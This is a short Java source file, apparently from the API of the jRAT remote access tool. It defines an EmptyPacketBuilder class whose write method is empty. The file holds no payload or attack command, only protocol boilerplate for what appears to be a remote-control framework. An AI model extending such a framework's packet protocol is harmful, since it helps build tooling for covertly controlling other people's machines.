package jrat.api.net;

import java.io.DataInputStream;
import java.io.DataOutputStream;

import jrat.api.Client;

public class EmptyPacketBuilder extends PacketBuilder {

	public EmptyPacketBuilder(short header, Client rat) {
		super(header, rat);
	}

	@Override
	public void write(Client rat, DataOutputStream dos, DataInputStream dis) throws Exception {
		
	}

}
